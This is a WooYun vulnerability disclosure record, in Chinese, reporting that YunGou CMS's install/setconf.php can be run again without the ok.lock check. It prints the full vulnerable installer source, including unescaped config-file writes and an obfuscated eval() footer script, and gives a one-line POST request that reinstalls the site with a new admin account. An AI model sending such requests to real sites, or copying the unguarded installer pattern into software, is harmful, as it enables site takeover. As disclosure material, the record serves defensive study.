{"id": 38656, "wybug_id": "wooyun-2015-095794", "wybug_title": "云购Cms#重装漏洞", "wybug_corp": "yungoucms.com", "wybug_author": "浅蓝", "wybug_date": "2015-02-11 15:00", "wybug_open_date": "2015-05-12 15:12", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-12：\t细节向公众公开  简要描述： 如题 详细说明：  在install目录下 有个setconf.php先来看看内容\n<?phpheader('Content-type: text/html; charset=utf-8');set_time_limit(0);ob_end_flush();ob_implicit_flush(true);if(isset($_POST['edit'])){\t$db_host = isset($_POST['db_host']) ? trim($_POST['db_host']) : '';\t$db_user = isset($_POST['db_user']) ? trim($_POST['db_user']) : '';\t$db_pwd = isset($_POST['db_pwd']) ? trim($_POST['db_pwd']) : '';\t$db_name = isset($_POST['db_name']) ? trim($_POST['db_name']) : '';\t$db_prefix = isset($_POST['db_prefix']) ? trim($_POST['db_prefix']) : '';\t$user_name = isset($_POST['user_name']) ? trim($_POST['user_name']) : '';\t$sqm_num= isset($_POST['sqm_num']) ? trim($_POST['sqm_num']) : '';\t$password = isset($_POST['password']) ? trim($_POST['password']) : '';\t$repassword = isset($_POST['repassword']) ? trim($_POST['repassword']) : '';\t$conn = mysql_connect($_POST['db_host'],$_POST['db_user'],$_POST['db_pwd']);\t$conn_db = mysql_select_db($_POST['db_name'],$conn);\tif(!$conn){\t\techo \"数据库主机或数据库用户名或数据库密码错误!\";exit;\t}elseif(!$conn_db){\t\techo '数据库名称!';exit;\t}elseif($db_name == ''){\t\techo '数据库不能为空!';exit;\t}elseif($db_prefix == ''){\t\techo '数据库前缀不能为空!';exit;\t}elseif(!preg_match(\"/^[\\w_]+_$/\",$db_prefix)){\t\techo '数据库前缀格式错误!';exit;\t}elseif($user_name == '' || $password == ''){\t\techo '登录名和密码不能为空!';exit;\t}elseif(strlen($password) < 6){\t\techo '登录密码不得小于6位';exit;\t}elseif($password!=$repassword){\t\techo '两次输入的密码不一致';exit;\t}\t$config_file='../system/config/database.inc.php';\t\t$con =\"<?php\\r\\n\\r\\n\";\t$con .= \"return array(\\r\\n\";\t\t$con .= \"\\t'default' => array (\\r\\n\\t\";\t\t\t$con .= \"\\t'hostname' => '\".$db_host.\"',\";\t\t\t$con .= \"\\r\\n\\t\\t'database' => '\".$db_name.\"',\";                \t\t\t$con .= \"\\r\\n\\t\\t'username' => '\".$db_user.\"',\";\t\t\t$con .= \"\\r\\n\\t\\t'password' => '\".$db_pwd.\"',\";\t\t\t$con .= \"\\r\\n\\t\\t'tablepre' => '\".$db_prefix.\"',\";\t\t\t$con .= \"\\r\\n\\t\\t'charset' => 'utf8',\";\t\t\t$con .= \"\\r\\n\\t\\t'type' => 'mysql',\";\t\t\t$con .= \"\\r\\n\\t\\t'debug' => true,\";\t\t\t$con .= \"\\r\\n\\t\\t'pconnect' => 0,\";\t\t\t$con .= \"\\r\\n\\t\\t'autoconnect' => 0\";\t\t$con .= \"\\r\\n\\t),\";\t$con .= \"\\r\\n);\\r\\n?>\";\tfile_put_contents($config_file,$con);\t\t\tif(!empty($sqm_num)){\t\t\t\t$sqm_file='../system/config/code.inc.php';\t\t$sqm=\"<?php return array('code'=>'$sqm_num'); ?>\";\t\tfile_put_contents($sqm_file,$sqm);\t\t\t}\t\t$conn = @mysql_connect($_POST['db_host'],$_POST['db_user'],$_POST['db_pwd']);\t\t\t mysql_select_db($_POST['db_name'],$conn);\tmysql_query(\"set names utf8\");\t\t$sql = file_get_contents(\"install.sql\");\t$sql = str_replace('DROP TABLE IF EXISTS `',\"DROP TABLE IF EXISTS `\".$_POST['db_prefix'],$sql);\t$sql = str_replace('CREATE TABLE `',\"CREATE TABLE `\".$_POST['db_prefix'],$sql);\t$sql = str_replace('INSERT INTO `',\"INSERT INTO `\".$_POST['db_prefix'],$sql);\t$sql = str_replace('IF EXISTS `',\"IF EXISTS `\".$_POST['db_prefix'],$sql);\t$array_sql = preg_split(\"/;[\\r\\n]/\",$sql);\t$query_sql_g=true;\techo \"<h3 style='text-align:center; line-height:50px; font-weight:bold'><font color='#0c0'>正在安装中...请不要结束本页面！</font></h3><br/>\";\techo \"<div style='text-align:center;width:100%'>\";\t\tif(strlen(end($array_sql)) == 2){\t\t\t\t\tarray_pop($array_sql);    }\t$ik = 0;\tforeach($array_sql as $sql){\t\t$sql = trim($sql);\t\t\t\tif (!empty($sql) && strlen($sql) != 2){\t\t\t$query_sql = mysql_query($sql,$conn);\t\t\tif(!$query_sql){\t\t\t\tif($ik%9==0){\t\t\t\t\techo \"<br/>\";\t\t\t\t}\t\t\t\techo $sql.\"<font color='red'>SQL 执行失败！</font>\";$ik++;\t\t\t}else{\t\t\t\tif($ik%9==0){\t\t\t\t\techo \"<br/>\";\t\t\t\t}\t\t\t\techo \"【SQL执行成功!】\";$ik++;\t\t\t}\t\t}\t\t\t}\t\t$password=md5(trim($password));\t$sql = \"INSERT INTO `\".$db_prefix.\"admin` (uid,mid,username,userpass) VALUES ('1','0','$user_name','$password')\";\t$q = mysql_query($sql,$conn);\tif(!$q){\t\t\t\t\techo $sql.\"<font color='red'>【添加管理员失败】</font>\";$ik++;\t}else{\t\techo \"【添加管理员成功】\";$ik++;\t}\techo \"</div>\";\t\tif(!$query_sql_g){\t\techo \"<br/><h3 style='text-align:center; line-height:50px; font-weight:bold'><font color='red'>数据库安装失败,请清空数据库后重新安装！</font></h3><br/>\";\t}else{\t\techo \"<br/><h3 style='text-align:center; line-height:50px; font-weight:bold'><a style='color:#f60' href='finish.php'>安装完成，点击进入！</a></h3><br/>\";\t}\texit;}if(file_exists(\"ok.lock\")){\techo \"程序已经安装过\";\techo \"<br>\";\techo \"重新安装请删除,install 文件夹下的 <font color='red'>ok.lock</font> 文件\";\texit;}/*if(!isset($_POST['startinstall'])){\techo \"<script>javascript:history.back()</script>\";}*/?><!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\"><head><title>云购系统安装</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"><link rel='stylesheet' type='text/css' href='images/install.css'></head><body><div id='installbox'><div class='msgtitle'>云购系统 安装向导</div><table width=\"780\" height=\"30\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" class=\"intable3\">  <tr>    <td style=\"color:#f5f5f5; text-align:center\">        <span style=\"display:block;float:left;width:23%;font-size:12px;\">1. 许可协议</span>        <span style=\"display:block;float:left;width:25%;font-size:12px;\">2. 环境检测</span>        <span style=\"display:block;float:left;width:25%;font-size:12px;\">3. 数据库设置</span>        <span style=\"display:block;float:left;width:25%;font-size:12px;color:#FFF;\">4. 安装完成</span>    </td>  </tr></table><h3>安装设置：</h3><form  method=\"post\" action=\"\" name=\"conf\" id=\"gxform\" style=\"margin:0; padding:0;\">\t<table width=\"98%\" border=\"0\" align=\"center\" cellpadding=\"5\" cellspacing=\"1\" class=\"tableoutline\" style=\"font-size:12px; color:#666;\">\t\t<tr class=\"firstalt\">\t\t\t<td width=\"48%\" valign=\"top\"><b>数据库主机</b><br><font>一般为localhost</font></td>\t\t\t<td><input type=\"text\" name=\"db_host\" id=\"db_host\" value=\"localhost\" maxlength=\"50\" style=\"width:250px;\" > *</td>\t\t</tr>\t\t                 \t\t<tr class=\"firstalt\">\t\t\t<td width=\"48%\"><b>数据库用户名</b><br><font color=\"#666666\">一般为root</font><br></td>\t\t\t<td><input type=\"text\" name=\"db_user\" id=\"db_user\" value=\"\" maxlength=\"50\" style=\"width:250px;\"> *</td>\t\t</tr>\t\t<tr bgcolor=\"#fdefe5\" class=\"firstalt\">\t\t\t<td width=\"48%\"><b>数据库密码</b><br><br></td>\t\t\t<td><input type=\"password\" name=\"db_pwd\" value=\"\" id=\"db_pwd\" maxlength=\"50\" style=\"width:250px;\" ></td>\t\t</tr>\t\t<tr class=\"firstalt\">\t\t\t<td width=\"48%\"><b>数据库名称</b><br><font color=\"red\"><b>请填写已存在的数据库名</b></font><br></td>\t\t\t<td><input type=\"text\" name=\"db_name\" id=\"db_name\" value=\"\" maxlength=\"50\" style=\"width:250px;\"> *</td>\t\t</tr>  \t\t<tr bgcolor=\"#fdefe5\" class=\"firstalt\">\t\t\t<td width=\"48%\"><p><b>数据库表前缀</b><br><font color=\"#666666\">建议您修改表前缀</font><br></p></td>\t\t\t<td><input type=\"text\" name=\"db_prefix\" id=\"db_prefix\" value=\"go_\"  maxlength=\"50\"  valid=\"required\"  style=\"width:250px;\" > *</td>\t\t</tr>\t\t<tr class=\"firstalt\" style=\"display:none;\">\t\t\t<td width=\"48%\"><p><b>授权码</b><br><font color=\"#666666\"><a target=\"_blank\" href=\"http://www.yungoucms.com/news-4-1.html\">购买授权码 </a></font><br></p></td>\t\t\t<td><input type=\"text\" name=\"sqm_num\" id=\"sqm_num\" value=\"975E312DA2618F549446B6523A6F9730E059AA112448\"  maxlength=\"50\"  valid=\"required\"  style=\"width:250px;\" > *</td>\t\t\t\t\t</tr>\t\t\t</table>\t<h3>后台设置：</h3>\t<table width=\"98%\" border=\"0\" align=\"center\" cellpadding=\"5\" cellspacing=\"1\" class=\"tableoutline\" style=\"font-size:12px; color:#666;\">\t\t<tr bgcolor=\"#fdefe5\" class=\"firstalt\">\t\t\t<td width=\"48%\"><p><b>管理员帐号</b><br><font color=\"#666666\">一般不用修改</font><br></p></td>\t\t\t<td><input type=\"text\" name=\"user_name\" id=\"user_name\" value=\"admin\"  maxlength=\"50\"  valid=\"required\"  style=\"width:250px;\" > *</td>\t\t</tr>\t\t<tr class=\"firstalt\">\t\t\t<td width=\"48%\"><p><b>密码</b><br><font color=\"#666666\">密码大于6位</font><br></p></td>\t\t\t<td><input type=\"password\" name=\"password\" id=\"password\" value=\"\"  maxlength=\"50\"  valid=\"required\"  style=\"width:250px;\" > *</td>\t\t</tr>\t\t<tr bgcolor=\"#fdefe5\" class=\"firstalt\">\t\t\t<td width=\"48%\"><p><b>确认密码</b></p></td>\t\t\t<td><input type=\"password\" name=\"repassword\" id=\"repassword\" value=\"\"  maxlength=\"50\"  valid=\"required\"  style=\"width:250px;\" > *</td>\t\t</tr>\t</table>\t<table width=\"100%\" cellpadding=\"0\" cellspacing=\"0\" border=\"0\">\t\t<tr class=\"firstalt\" style=\"height:10px\">\t\t\t<td height=\"70\" colspan=\"2\" align=\"center\">\t\t\t\t<input style=\"width:120px; height:30px;\" type=\"button\" class=\"btn\"  value=\"上一步\" onClick=\"history.back();\"/> \t\t\t\t<input style=\"width:120px; height:30px;\" type=\"submit\" name=\"edit\" value=\"下一步\" class=\"btn\" id=\"submit\"> \t\t\t\t<span id=\"loading\" style=\"font-size:13px;color:#FF0000;display:none\"><font color=\"#0066CC\">请稍等...正在与MYSQL数据库进行连接。</font></span>\t\t\t</td>\t\t</tr>\t\t<tr class=\"firstalt\" style=\"height:10px\">\t\t\t<td colspan=\"2\" align=\"center\"><div id='msgbottom'><script language=javascript>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p;}('u[\"\\\\9\\\\2\\\\c\\\\t\\\\v\\\\1\\\\3\\\\0\"][\"\\\\e\\\\5\\\\h\\\\0\\\\1\\\\4\\\\3\"](\"\\\\x\\\\w\\\\q\\\\p\\\\l\\\\m\\\\s\\\\r\\\\y\\\\F\\\\n\\\\7 \\\\d\\\\5\\\\1\\\\f\\\\8\\\\\"\\\\d\\\\0\\\\0\\\\j\\\\b\\\\/\\\\/\\\\6\\\\6\\\\i\\\\k\\\\a\\\\2\\\\j\\\\1\\\\k\\\\c\\\\3\\\\/\\\\\" \\\\i\\\\0\\\\G\\\\4\\\\1\\\\8\\\\\"\\\\c\\\\2\\\\4\\\\2\\\\5\\\\b\\\\5\\\\1\\\\9\\\\o\\\\f\\\\2\\\\3\\\\0\\\\z\\\\e\\\\1\\\\h\\\\a\\\\d\\\\0\\\\b \\\\6\\\\2\\\\4\\\\9\\\\o\\\\\"  \\\\0\\\\7\\\\5\\\\a\\\\1\\\\0\\\\8\\\\\"\\\\D\\\\6\\\\4\\\\7\\\\3\\\\A\\\\\"\\\\g\\\\B\\\\C\\\\l\\\\m\\\\H\\\\E\\\\n\\\\/\\\\7\\\\g\");',44,44,'x74|x65|x6f|x6e|x6c|x72|x62|x61|x3d|x64|x67|x3a|x63|x68|x77|x66|x3e|x69|x73|x70|x2e|u6e90|u7801|x3c|x3b|u54c1|u7cbe|u70b9|u8bf7|x75|window|x6d|u591a|u66f4|u51fb|x2d|x6b|u72d7|u6251|x5f|u533a|uff1a|x79|u793e'.split('|'),0,{}))</script></div></td>\t\t</tr>\t</table></form></div></body></html>\n虽然index  check.php 等文件都验证 唯独重要的setconf.php没有\nPOSThttp://localhost/yungou/install/setconf.phpedit=&db_host=localhost&db_user=root&db_pwd=&db_name=yungou&db_prefix=go_&user_name=admin&password=123456&repassword=123456\n\n\n直接重装了   漏洞证明：  如上   修复方案：  对ok.lock做下验证   版权声明：转载请注明来源 浅蓝@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-02-11 15:11 厂商回复： 以前的版本是有这个问题 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-11 15:22 |    \t\t蛇精病 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:10        | 你连棒棒糖都没有，还谈什么狗屁爱情？)\t\t \n  审核了5天，终于出来    \n     2015-03-03 17:42 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  原来这就是重装，知道数据库帐号密码的情况下....    \n     2015-03-03 18:29 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  @Mosuan 你真有意思  那是我新的数据库配置信息。 呵呵    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}